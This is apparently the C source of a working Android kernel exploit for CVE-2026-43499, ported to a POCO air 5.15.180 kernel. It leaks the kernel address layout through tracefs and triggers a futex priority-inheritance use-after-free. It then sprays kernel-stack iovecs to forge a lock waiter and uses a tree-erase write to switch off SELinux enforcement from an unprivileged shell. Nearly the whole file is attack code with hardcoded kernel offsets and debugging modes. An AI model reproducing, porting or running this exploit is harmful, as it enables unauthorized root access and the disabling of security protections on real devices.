//
// poc_air.c — CVE-2026-43499 (GhostLock) port to POCO air 5.15.180 GKI
//
// Adapted from the a54x working poc.c (zainarbani / telegram author, confirmed
// write-0 to selinux_state->enforcing on 5.15.189). The ONLY changes from the
// a54x original:
//   1) KASLR: tracefs sched_blocked_reason slide leak (reliable; leaks the
//      fixed return address of bl schedule inside worker_thread -> exact slide).
//      (the old perf-event min-IP leak was unreliable: the sampled min IP floats
//      around the image, so the computed base was off by a non-constant amount.)
//   2) ksym_offs[] = POCO 5.15.180 link-time offsets (relative to _text).
//   3) PROBE mode (env PROBE=1): spray valid user-address sentinels
//      (0xabcdef00|i<<8) in all waiter fields except lock=fake_lock.
//      Full two-phase run; panic fault address or enforce=0 confirms
//      which iov slot maps to waiter fields (especially parent_color).
//
// Build (NDK r29):
//   /mnt/Data/AI_Workspace/android-ndk-r29/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
//     -O2 -static -pthread poc_air.c -o poc_air
//
// Run (device, uid 2000 shell): ./poc_air   (PROBE=1 ./poc_air to map fields;
//   IOV_IDX=d ./poc_air to spray precisely at displacement d learned from PROBE)
//
// PRIMITIVE (adapted from a54x; fake_lock = ZEROED BSS rt_mutex at uid_lock+0x200,
//   NOT inet6_protos+0x90 which is RO, and NOT the uid_lock spinlock itself which
//   is garbage when read as an rt_mutex):
//   sendmmsg iovec spray overwrites Y's dangling rt_mutex_waiter on its own
//   kernel stack (CVE-2026-43499 UAF left by the PI-cycle EDEADLK). waiter.task
//   -> init_task, waiter.lock -> ZEROED fake rt_mutex (owner==0, wait_lock==0,
//   empty tree) so the walk exits cleanly. PHASE1 settles the ghost. PHASE2 re-sprays
//   tree_entry.__rb_parent_color=selinux_state-8 with children=0, lock=fresh
//   uid_lock+0x300 (distinct zeroed BSS rt_mutex), re-trigger -> rb_erase NULL-writes
//   selinux_state->enforcing (= +0).

#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <stdatomic.h>
#include <linux/futex.h>
#include <stdint.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/resource.h>
#include <poll.h>
#include <time.h>
#include <stdarg.h>
#include <sys/select.h>
#include <sys/wait.h>

#define FUTEX_LOCK_PI             6
#define FUTEX_UNLOCK_PI           7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG      128
#define FUTEX_LOCK_PI_PRIVATE         (FUTEX_LOCK_PI         | FUTEX_PRIVATE_FLAG)
#define FUTEX_WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FUTEX_CMP_REQUEUE_PI_PRIVATE  (FUTEX_CMP_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)

#define __NR_futex_aarch64  98
#define __NR_sched_setscheduler 119
#ifndef __NR_process_vm_writev
#define __NR_process_vm_writev 270
#endif
#ifndef KEYCTL_INSTANTIATE_IOV
#define KEYCTL_INSTANTIATE_IOV 12
#endif

/* ── POCO air 5.15.180 GKI ─────────────────────────────────────────────────── */
#define KIMAGE_TEXT_BASE     0xffffffc008000000ULL

/* Link-time offsets (nm of kernel_5-15-180-vmlinux.elf, _text=0xffffffc008000000).
 * Runtime VA = KIMAGE_TEXT_BASE + slide + off. */
struct ksym_off { const char *name; uint64_t off; };
static const struct ksym_off ksym_offs[] = {
    { "empty_zero_page",  0xad53000ULL },
    { "init_cred",        0xabfd698ULL },
    { "init_task",        0xac43640ULL },
    { "modprobe_path",    0xab24120ULL },
    { "selinux_state",    0xada9d78ULL },   /* enforcing @ +0 */
    { "panic_timeout",    0xab20680ULL },
    { "inet6_protos",     0xab0b3f8ULL },   /* RO on this build — do NOT use as fake_lock */
    { "uid_lock",         0xadca680ULL },   /* writable BSS spinlock; anchor for ZEROED fake_lock at +0x200/+0x300 */
    { "kmalloc_caches",   0xa164a60ULL },   /* low pre-init .data — UNTESTED mapped fake_lock candidate */
    { "security_hook_heads", 0xa1617e0ULL },/* low pre-init .data — UNTESTED mapped fake_lock candidate */
    { "init_mm",          0xac87a28ULL },   /* GAP region (unmapped, for comparison) */
    { "root_task_group",  0xad57ac0ULL },   /* .bss (unmapped, for comparison) */
    { "memstart_addr",    0xa164a50ULL },
    { "kimage_voffset",   0xa164a58ULL },
};

static uint64_t kaslr_base  = KIMAGE_TEXT_BASE;
static uint64_t kaslr_slide = 0;

static uint64_t kaddr_of(const char *name) {
    for (size_t i = 0; i < sizeof(ksym_offs)/sizeof(ksym_offs[0]); i++)
        if (strcmp(name, ksym_offs[i].name) == 0)
            return kaslr_base + ksym_offs[i].off;
    return 0;
}
static unsigned long resolve(const char *name) { return (unsigned long)kaddr_of(name); }

/* ── KASLR slide leak via tracefs sched_blocked_reason (reliable) ──────────── */
/* The trace fires for every blocked task; `caller` is the return address of the
 * bl schedule inside worker_thread (kworkers are the most frequent sleepers),
 * so the modal `caller` leaks a FIXED instruction address -> exact slide. */
#define TRACE_EVENT_ID            108
#define SLIDE_WORKER_CALLER_OFF   0x178510ULL   /* worker_thread+0x7c = ret of bl schedule */

/* signed env parser (supports decimal and 0x hex, e.g. -0x8000000) */
static int64_t env_signed(const char *name, int64_t def) {
    const char *v = getenv(name);
    if (!v || !*v) return def;
    return (int64_t)strtoll(v, NULL, 0);
}

static volatile sig_atomic_t g_kaslr_timed_out;
static void kaslr_on_alarm(int s) { (void)s; g_kaslr_timed_out = 1; }

static int tracefs_write(const char *path, const char *val) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return n == (ssize_t)strlen(val);
}

/* caller field offset from the event format (GKI-stable; fallback 16) */
static int sched_blocked_reason_caller_off(void) {
    int fd = open("/sys/kernel/tracing/events/sched/sched_blocked_reason/format", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 16;
    char buf[1024]; ssize_t n = read(fd, buf, sizeof(buf) - 1); close(fd);
    if (n <= 0) return 16; buf[n] = 0;
    char *p = strstr(buf, "caller");
    if (!p) return 16;
    int off = -1;
    sscanf(p, "caller;%*[\t ]offset:%d", &off);
    if (off < 0) sscanf(p, "caller; offset:%d", &off);
    if (off < 0) sscanf(p, "field:void* caller; offset:%d", &off);
    return off < 0 ? 16 : off;
}

static uint64_t tracefs_leak_text_base(void) {
    signal(SIGALRM, kaslr_on_alarm);
    int coff = sched_blocked_reason_caller_off();
    if (!tracefs_write("/sys/kernel/tracing/tracing_on", "0") ||
        !tracefs_write("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "1") ||
        !tracefs_write("/sys/kernel/tracing/tracing_on", "1")) {
        fprintf(stderr, "[kaslr] tracefs enable failed errno=%d\n", errno);
        return 0;
    }
    usleep(300000);
    int nprocs = (int)sysconf(_SC_NPROCESSORS_ONLN);
    uint64_t callers[4096]; int n = 0;
    for (int cpu = 0; cpu < nprocs && n < 4096; cpu++) {
        char path[128];
        snprintf(path, sizeof(path), "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
        int fd = open(path, O_RDONLY | O_CLOEXEC);
        if (fd < 0) continue;
        unsigned char buf[262144]; ssize_t got = 0;
        g_kaslr_timed_out = 0; alarm(2);
        while ((size_t)got < sizeof(buf)) {
            ssize_t r = read(fd, buf + got, (size_t)(sizeof(buf) - got));
            if (r <= 0 || g_kaslr_timed_out) break;
            got += r;
        }
        alarm(0); close(fd);
        for (ssize_t off = 0; off < got && n < 4096;) {
            uint64_t commit; memcpy(&commit, buf + off + 8, 8);
            size_t data_len = (size_t)(commit & 0xfffULL);
            size_t page_end = off + 16 + data_len; if (page_end > (size_t)got) page_end = (size_t)got;
            for (size_t pos = 16; pos + 4 <= page_end && n < 4096;) {
                uint32_t hd; memcpy(&hd, buf + pos, 4);
                uint32_t t = hd & 0x1fU;
                if (t == 30) { pos += 8; continue; }
                if (t == 31) { pos += 12; continue; }
                if (t == 0 || t >= 29) break;
                size_t rec_len = (size_t)t * 4; size_t rec = pos + 4;
                if (rec + rec_len > page_end) break;
                uint16_t eid; memcpy(&eid, buf + rec, 2);
                if (eid == TRACE_EVENT_ID && rec_len >= (size_t)(coff + 8)) {
                    uint64_t caller; memcpy(&caller, buf + rec + coff, 8);
                    if (caller >= KIMAGE_TEXT_BASE) callers[n++] = caller;
                }
                pos = rec + rec_len;
            }
            off = (page_end + 15) & ~(size_t)15;
        }
    }
    tracefs_write("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");
    tracefs_write("/sys/kernel/tracing/tracing_on", "0");
    if (n == 0) { fprintf(stderr, "[kaslr] no sched_blocked_reason samples\n"); return 0; }
    /* modal caller == worker_thread's schedule-return address */
    uint64_t mode = 0; int modecnt = 0;
    for (int i = 0; i < n; i++) {
        int c = 0; for (int j = 0; j < n; j++) if (callers[j] == callers[i]) c++;
        if (c > modecnt) { modecnt = c; mode = callers[i]; }
    }
    uint64_t linked = KIMAGE_TEXT_BASE + SLIDE_WORKER_CALLER_OFF;
    int64_t slide = (int64_t)mode - (int64_t)linked;
    if (slide <= 0 || (slide & 0x1fffff) != 0 || slide > (int64_t)0x4000000000ULL) {
        fprintf(stderr, "[kaslr] slide reject %016llx (mode %016llx cnt %d)\n",
                (unsigned long long)slide, (unsigned long long)mode, modecnt);
        return 0;
    }
    int64_t kaslr_off = env_signed("KASLR_OFF", 0); /* tracefs is exact; 0 unless overridden */
    int64_t base = (int64_t)(KIMAGE_TEXT_BASE + (uint64_t)slide) + kaslr_off;
    fprintf(stderr, "[kaslr] tracefs base=%016llx slide=%016llx (mode cnt %d, samples %d)\n",
            (unsigned long long)(uint64_t)base, (unsigned long long)slide, modecnt, n);
    return (uint64_t)base;
}

/* ── futex / syscalls ──────────────────────────────────────────────────────── */
static int pi1 = 0, pi2 = 0, cond = 0;
static atomic_int y_locked_l2 = 0, x_locked_l1 = 0, y_parking = 0, x_blocking = 0;
static _Atomic int y_done = 0;
static atomic_int respray_done = 0;
static atomic_int respray_ready = 0;
static unsigned long respray_parent_color = 0;
static atomic_int y_tid = 0, x_tid = 0, z_tid = 0;

long syscall(long, ...);
static long futex_svc(volatile int *uaddr1, long op, long val, long val2, volatile int *uaddr2, long val3) {
    register long x0 __asm__("x0") = (long)uaddr1;
    register long x1 __asm__("x1") = op;
    register long x2 __asm__("x2") = val;
    register long x3 __asm__("x3") = val2;
    register long x4 __asm__("x4") = (long)uaddr2;
    register long x5 __asm__("x5") = val3;
    register long x8 __asm__("x8") = __NR_futex_aarch64;
    __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8) : "memory","cc");
    return x0;
}
static long sysc4(long n, long a, long b, long c, long d) {
    register long x8 __asm__("x8") = n; register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0" : "+r"(x0) : "r"(x8),"r"(x1),"r"(x2),"r"(x3) : "memory");
    return x0;
}

/* Spray the iovec array into the kernel on-stack iovstack via the chosen syscall.
 * sendmsg (sendmmsg): sock_sendmsg path. writev: do_iter_write path (different
 * kernel frame depth -> different displacement K relative to the freed waiter).
 * Both copy iovecs to iovstack[8] for iovcnt<=8; for bad base/len they return
 * EFAULT after the copy, so the stack is still contaminated for the pivot. */
static int g_iov_idx = 0;                          /* PHASE1+PHASE2 displacement (set via IOV_IDX / PROBE). d=0 = POCO 5.15.180 confirmed (waiter at iov[0], task/lock at iov[3]). */
static const char *g_spray_method = "sendmsg";     /* spray syscall: "sendmsg" (sendmmsg) or "writev" or "pvmw" (process_vm_writev) or "keyctl" (KEYCTL_INSTANTIATE_IOV) */
static void *g_pvmw_remote = NULL;                 /* mmap'd self buffer used as remote_iov for pvmw spray */
static struct iovec g_pvmw_remote_iov;
static void do_spray(int fd, struct iovec *iov) {
    if (strcmp(g_spray_method, "writev") == 0) {
        (void)syscall(SYS_writev, (long)fd, (long)iov, 8L);
    } else if (strcmp(g_spray_method, "pvmw") == 0) {
        g_pvmw_remote_iov.iov_base = g_pvmw_remote;
        g_pvmw_remote_iov.iov_len  = 1;
        (void)syscall(__NR_process_vm_writev, (long)getpid(), (long)iov, 8L,
                      (long)&g_pvmw_remote_iov, 1L, 0L);
    } else if (strcmp(g_spray_method, "keyctl") == 0) {
        (void)syscall(SYS_keyctl, KEYCTL_INSTANTIATE_IOV, (long)-1, (long)iov, 8L, 0L);
    } else {
        struct mmsghdr { struct msghdr msg_hdr; unsigned int msg_len; } mv;
        memset(&mv, 0, sizeof mv);
        mv.msg_hdr.msg_iov = iov; mv.msg_hdr.msg_iovlen = 8;
        (void)syscall(SYS_sendmmsg, (long)fd, (long)&mv, 1L, 0L);
    }
}

/* ── resolved symbols ──────────────────────────────────────────────────────── */
static unsigned long kaddr_init_cred, kaddr_init_task, kaddr_modprobe, kaddr_selinux, kaddr_panic;
static unsigned long kaddr_empty_zero_page;
static unsigned long fake_lock_addr, fake_lock2_addr;
static unsigned long k_safe_write_value;

static int y_sched_policy = SCHED_NORMAL;
static long trigger_adj_pi(pid_t tid) {
    struct sched_param sp = { .sched_priority = 0 };
    int pol = (y_sched_policy == SCHED_NORMAL) ? SCHED_BATCH : SCHED_NORMAL;
    long r = sysc4(__NR_sched_setscheduler, (long)tid, (long)pol, (long)&sp, 0);
    y_sched_policy = pol;
    return r;
}

static const char *enforce_path = "/sys/fs/selinux/enforce";
static long read_enforce(void) {
    FILE *pf = fopen(enforce_path, "r"); long v = -2;
    if (pf) { if (fscanf(pf, "%ld", &v) != 1) v = -999; fclose(pf); }
    return v;
}

/* ── iov index: which iov[k] carries (task=iov_base, lock=iov_len) ──────────── */
/* Kernel-build-specific. Default 1 (a54x 5.15.189 / poc.c reference).
 * Override at runtime with IOV_IDX=k after learning it via PROBE mode. */

/* ── PROBE spray: per-index sentinels ──────────────────────────────────────── */
/* Matches el02.c / poc-ref pattern: magic high bits + iov index.
 * The panic fault address preserves the full sentinel so we can extract
 * the iov index and infer the waiter field from the reference mapping. */
#define SENT_BASE 0xabcdef0000000000ULL
#define SENT(i) ((void *)(SENT_BASE | ((uint64_t)(i) << 8)))

/* ── Z: FUTEX_LOCK_PI(L2) walks into the ghost ─────────────────────────────── */
static void *thread_Z(void *arg) {
    (void)arg; atomic_store(&z_tid, syscall(SYS_gettid));
    fprintf(stderr,"[Z] tid=%d\n", z_tid);
    while (!atomic_load(&y_done)) ;
    fprintf(stderr,"[Z] FUTEX_LOCK_PI(L2): walk into pi_blocked_on\n");
    long r = futex_svc(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    fprintf(stderr,"[Z] LOCK_PI(L2) returned %ld (UNEXPECTED if pivot worked)\n", r);
    while (1) ;
    return NULL;
}

/* ── Y: owns L2, parks on cond->L1, then sprays its own dangling waiter ─────── */
static void *thread_Y(void *arg) {
    (void)arg; atomic_store(&y_tid, syscall(SYS_gettid));
    fprintf(stderr,"[Y] tid=%d\n", y_tid);
    if (g_pvmw_remote == NULL) {
        g_pvmw_remote = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (g_pvmw_remote == MAP_FAILED) fprintf(stderr,"[Y] pvmw mmap failed\n");
    }
    long r = futex_svc(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { fprintf(stderr,"[Y] LOCK_PI(L2) failed: %s\n", strerror((int)-r)); return NULL; }
    atomic_store(&y_locked_l2, 1);
    while (!atomic_load(&x_locked_l1)) sched_yield();
    atomic_store(&y_parking, 1);
    r = futex_svc(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

    int sv[2] = { -1, -1 };
    syscall(SYS_socketpair, 1L, 2L, 0L, (long)sv);

    /* iovlen MUST be <= 8: ___sys_sendmsg copies iovecs on-stack (iovstack[8])
     * only when iovlen<=UIO_FASTIOV; larger counts kmalloc to the HEAP and
     * never overlap a kernel-stack waiter. randomize_kstack_offset is OFF on
     * this device, so the displacement is deterministic.
     *
     * POCO 5.15.180 confirmed layout (from xiaomi_kernel_5.15.94 source + BTF):
     *   iov[0] = tree_entry.__rb_parent_color (+0x00)
     *   iov[3] = task (+0x30) / lock (+0x38)
     * This differs from a54x poc2.c which uses iov[1]/iov[4] due to 24-byte
     * rb_node on this kernel vs 16-byte assumption in reference. */
    static struct iovec iov[8];
    int probe = (getenv("PROBE") != NULL);
    /* Displacement confirmed via PROBE: sendmsg D=+0x30, base-first, so
       iov[0].iov_base=task(+0x30) and iov[0].iov_len=lock(+0x38). li=0. */
    int li = 0;

    if (probe) {
        fprintf(stderr,"[Y] PROBE spray: DISTINCT sentinels base=SENT(100+i) len=SENT(200+i) in all 8 iovs; lock LEFT as sentinel so walk faults at first lock deref. Panic FAR/x27 = the sentinel value at the lock field -> pins base-vs-len AND the iov index of the lock field (i.e. the displacement D).\n");
        for (int i = 0; i < 8; i++) {
            iov[i].iov_base = (void *)SENT(100 + i);
            iov[i].iov_len  = (unsigned long)SENT(200 + i);
        }
        /* NOTE: intentionally do NOT override lock -> walk faults reading the lock
           field; the sentinel in x27 tells us whether lock = iov[k].iov_base
           (=> D = +0x30, base-first) or iov[k].iov_len (=> D = +0x38, len-first),
           and k gives the displacement. Run with SPRAY=writev to hunt a D<=0 config. */
    } else {
         int d = g_iov_idx;
         fprintf(stderr,"[Y] PHASE1 spray: settle ghost (d=%d method=%s: li=%d parent@iov0..%d)\n",
                 d, g_spray_method, li, d+2);
         for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
         iov[li].iov_base = (void *)kaddr_init_task;
         iov[li].iov_len  = (unsigned long)fake_lock_addr;
    }

    struct mmsghdr { struct msghdr msg_hdr; unsigned int msg_len; };
    static struct mmsghdr mv; memset(&mv, 0, sizeof mv);
    mv.msg_hdr.msg_iov = iov; mv.msg_hdr.msg_iovlen = 8;
    fprintf(stderr, "[Y] SPRAY-DEBUG iovstack base=%p  &iov[4]=%p  method=%s\n",
            (void *)iov, (void *)&iov[4], g_spray_method);
    do_spray(sv[0], iov);   /* last syscall in Y (PHASE1) */

    atomic_store_explicit(&y_done, 1, memory_order_release);

      /* PHASE 2 (write): re-spray the poisoned waiter precisely at displacement
       * d=g_iov_idx: __rb_parent_color = selinux-8, rb_right = k_safe_write_value
       * (empty_zero_page: low byte 0x00 -> enforcing=0, byte2 0x53 -> initialized=1),
       * rb_left = 0, lock = fake_lock2 (fresh zeroed BSS rt_mutex @ uid_lock+0x300).
       * rb_erase sees ghost has a child (rb_right != NULL), so child = k_safe_write_value.
       * parent->rb_right = child writes the safe value to selinux_state->enforcing (+0).
       * This keeps selinux initialized=1 and avoids corrupting adjacent fields. */
       while (!respray_ready) sched_yield();
       respray_ready = 0;
       {
            int d = g_iov_idx;
           fprintf(stderr,"[Y] PHASE2 spray: d=%d li=%d parent=selinux-8 rb_right=safe(empty_zero_page) rb_left=0 lock=fake_lock2\n", d, li);
           for (int i = 0; i < 8; i++) { iov[i].iov_base = (void *)0x0UL; iov[i].iov_len = 0UL; }
           iov[d].iov_base   = (void *)(kaddr_selinux - 8);    /* __rb_parent_color = selinux-8 (waiter+0x00) */
           iov[d].iov_len    = (unsigned long)k_safe_write_value; /* rb_right = safe value -> rb_erase writes it to selinux enforcing */
           if (d + 1 < 8) iov[d+1].iov_base = (void *)0x0UL;   /* rb_left = 0 */
           iov[li].iov_base = (void *)kaddr_init_task;        /* waiter->task */
           iov[li].iov_len  = (unsigned long)fake_lock2_addr; /* waiter->lock = ZEROED fake_lock2 */
           do_spray(sv[0], iov);
     }
    atomic_store_explicit(&respray_done, 1, memory_order_release);

    while (1) { sched_yield(); }
    return NULL;
}

/* ── X: owns L1, blocks on L2 (held by Y) ──────────────────────────────────── */
static void *thread_X(void *arg) {
    (void)arg; atomic_store(&x_tid, syscall(SYS_gettid));
    fprintf(stderr,"[X] tid=%d\n", x_tid);
    while (!atomic_load(&y_locked_l2)) sched_yield();
    long r = futex_svc(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { fprintf(stderr,"[X] LOCK_PI(L1) failed: %s\n", strerror((int)-r)); return NULL; }
    atomic_store(&x_locked_l1, 1);
    atomic_store(&x_blocking, 1);
    r = futex_svc(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);   /* blocks (cycle) */
    fprintf(stderr,"[X] LOCK_PI(L2) returned %ld\n", r);
    return NULL;
}

static void do_2(void) {
    pthread_t tz; pthread_create(&tz, NULL, thread_Z, NULL);
    usleep(500000);
    fprintf(stderr,"[do_2] Z blocked on L2 — chain walk survived\n");

    if (getenv("PROBE")) {
        int d = g_iov_idx;
        int li = (strcmp(g_spray_method, "writev") == 0) ? 0 : 4;
        fprintf(stderr,"[do_2] PROBE: full two-phase (settle + write) with sentinels\n");
        fprintf(stderr,"[do_2] PHASE1: settle ghost (lock=fake_lock@iov[%d], other fields=sentinels)\n", li);
        int ret = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
        if (ret < 0) { fprintf(stderr,"[phase1] sched_setscheduler failed: %s\n", strerror((int)-ret)); return; }
        usleep(100000);
        fprintf(stderr,"[phase1] chain walk OK (kernel alive) — if no panic, lock mapping is iov[%d]\n", li);

        fprintf(stderr,"[phase2] re-spray parent=selinux-8@iov[%d] lock=fake_lock2@iov[%d], other fields=sentinels\n", d, li);
        respray_parent_color = kaddr_selinux - 8;
        atomic_store_explicit(&respray_ready, 1, memory_order_release);
        while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();

        int ret2 = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
        if (ret2 < 0) { fprintf(stderr,"[phase2] sched_setscheduler failed: %s\n", strerror((int)-ret2)); return; }
        usleep(100000);
        fprintf(stderr,"[phase2] chain walk done\n");

        long after = read_enforce();
        fprintf(stderr,"[phase2] /sys/fs/selinux/enforce AFTER = %ld\n", after);
        if (after == 0) {
            fprintf(stderr,"[rw] PROBE SUCCESS: write primitive confirmed (enforcing 1 -> 0)\n");
            fprintf(stderr,"[rw] mapping: iov[%d] = task/lock, iov[%d] = parent_color (selinux-8)\n", li, d);
        } else {
            fprintf(stderr,"[rw] PROBE: write did NOT land (enforce still %ld) — check panic for sentinel 0xabcdef00XX\n", after);
        }

        while (1) sched_yield();
    }

    fprintf(stderr,"[phase1] sched_setscheduler(Y) -> rb_erase NULL write to root (settle)\n");
    int ret = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
    if (ret < 0) { fprintf(stderr,"[phase1] sched_setscheduler failed: %s\n", strerror((int)-ret)); return; }
    usleep(100000);
    fprintf(stderr,"[phase1] chain walk OK (kernel alive)\n");

    /* PHASE 2: re-spray poisoned waiter, then trigger -> rb_erase NULL-writes selinux */
    fprintf(stderr,"[phase2] request re-spray (parent=selinux-8, lock=fake_lock2 @ uid_lock+0x300)\n");
    respray_parent_color = kaddr_selinux - 8;
    atomic_store_explicit(&respray_ready, 1, memory_order_release);
    while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
    fprintf(stderr,"[phase2] sched_setscheduler(Y) -> rb_erase NULL write to selinux\n");
    int ret2 = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
    if (ret2 < 0) { fprintf(stderr,"[phase2] sched_setscheduler failed: %s\n", strerror((int)-ret2)); return; }
    usleep(100000);
    fprintf(stderr,"[phase2] chain walk done\n");

    long after = read_enforce();
    fprintf(stderr,"[phase2] /sys/fs/selinux/enforce AFTER = %ld\n", after);
    if (after == 0) fprintf(stderr,"[rw] WRITE PRIMITIVE CONFIRMED: enforcing 1 -> 0\n");
    else fprintf(stderr,"[rw] write did NOT land (enforce still %ld) — ensure IOV_IDX=d from PROBE\n", after);

    fprintf(stderr,"\n[do_2] === SUMMARY ===\n");
    fprintf(stderr,"  fake_lock   = 0x%lx (uid_lock+0x200, ZEROED BSS rt_mutex)\n", fake_lock_addr);
    fprintf(stderr,"  fake_lock2  = 0x%lx (uid_lock+0x300, ZEROED BSS rt_mutex)\n", fake_lock2_addr);
    fprintf(stderr,"  init_task   = 0x%lx\n", kaddr_init_task);
    fprintf(stderr,"  selinux_state = 0x%lx\n", kaddr_selinux);
    fprintf(stderr,"  init_cred   = 0x%lx\n", kaddr_init_cred);
    fprintf(stderr,"  modprobe_path = 0x%lx\n", kaddr_modprobe);
}

static void sigusr1_handler(int sig) { (void)sig; }

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);
    pid_t tgid = getpid();
    signal(SIGUSR1, sigusr1_handler);

    const char *idx = getenv("IOV_IDX");
    if (idx) { int v = atoi(idx); if (v >= 0 && v < 8) g_iov_idx = v; }
    const char *spray = getenv("SPRAY");
    if (spray && (strcmp(spray, "writev") == 0 || strcmp(spray, "sendmsg") == 0
                  || strcmp(spray, "pvmw") == 0 || strcmp(spray, "keyctl") == 0))
        g_spray_method = spray;
    fprintf(stderr,"[main] g_iov_idx=%d (override with IOV_IDX=k)  spray=%s\n", g_iov_idx, g_spray_method);

    kaslr_base = tracefs_leak_text_base();
    if (!kaslr_base) { fprintf(stderr,"[kaslr] FATAL: tracefs leak failed\n"); return EXIT_FAILURE; }
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    fprintf(stderr,"[kaslr] base=0x%lx slide=0x%lx\n", kaslr_base, kaslr_slide);

    kaddr_init_cred = resolve("init_cred");
    kaddr_init_task = resolve("init_task");
    kaddr_modprobe  = resolve("modprobe_path");
    kaddr_selinux   = resolve("selinux_state");
    kaddr_panic     = resolve("panic_timeout");
    kaddr_empty_zero_page = resolve("empty_zero_page");
    /* fake_lock: a zeroed rt_mutex (owner==0, wait_lock==0, empty tree) so the
     * chain walk exits cleanly. Default anchor is uid_lock+0x200 (zeroed BSS).
     * FAKE_MEM=zero  -> empty_zero_page (guaranteed mapped+zeroed) for testing.
     * FAKE_MEM=<sym> -> use resolve(<sym>) as fake_lock (probe a known address). */
    const char *fm = getenv("FAKE_MEM");
    if (fm && !strcmp(fm, "zero")) {
        fake_lock_addr  = kaddr_empty_zero_page;
        fake_lock2_addr = kaddr_empty_zero_page;
    } else if (fm && *fm) {
        fake_lock_addr  = resolve(fm);
        fake_lock2_addr = resolve(fm);
    } else {
        fake_lock_addr  = resolve("uid_lock") + 0x200;
        fake_lock2_addr = resolve("uid_lock") + 0x300;
    }
    k_safe_write_value = kaddr_empty_zero_page;       /* low byte 0x00 -> enforcing=0; byte2 nonzero -> initialized stays 1 */
    fprintf(stderr,"  init_task   = 0x%lx\n", kaddr_init_task);
    fprintf(stderr,"  selinux_state = 0x%lx (enforcing @ +0)\n", kaddr_selinux);
    fprintf(stderr,"  fake_lock   = 0x%lx (uid_lock+0x200, ZEROED BSS rt_mutex)\n", fake_lock_addr);
    fprintf(stderr,"  fake_lock2  = 0x%lx (uid_lock+0x300, ZEROED BSS rt_mutex)\n", fake_lock2_addr);
    fprintf(stderr,"  safe_write  = 0x%lx (empty_zero_page: low byte 0x00, byte2 0x53)\n", k_safe_write_value);
    if (!kaddr_init_task || !fake_lock_addr || !kaddr_selinux) {
        fprintf(stderr,"[main] FATAL: unresolved symbols\n"); return EXIT_FAILURE;
    }

    pthread_t tx, ty;
    pthread_create(&ty, NULL, thread_Y, NULL);
    while (!atomic_load(&y_locked_l2)) sched_yield();
    pthread_create(&tx, NULL, thread_X, NULL);

    while (!(atomic_load(&y_locked_l2) && atomic_load(&x_locked_l1) &&
             atomic_load(&y_parking) && atomic_load(&x_blocking))) sched_yield();
    usleep(200000);

    fprintf(stderr,"[main] topology ready; FUTEX_CMP_REQUEUE_PI(cond) -> cycle\n");
    long r = futex_svc(&cond, FUTEX_CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
    cond = 1; __atomic_thread_fence(__ATOMIC_SEQ_CST);
    tgkill(tgid, atomic_load_explicit(&y_tid, memory_order_acquire), SIGUSR1);

    fprintf(stderr,"[main] CMP_REQUEUE_PI returned %ld", r);
    if (r >= 0) { fprintf(stderr," (no deadlock — cycle NOT detected)\n"); return EXIT_FAILURE; }
    fprintf(stderr," (%s)\n", strerror((int)-r));
    if (-r != EDEADLK && -r != EDEADLOCK) { fprintf(stderr,"[main] not EDEADLK\n"); return EXIT_FAILURE; }
    fprintf(stderr,"[main] -EDEADLK: full chainwalk caught PI cycle\n");

    while (!atomic_load_explicit(&y_done, memory_order_acquire));
    do_2();
    return EXIT_SUCCESS;
}
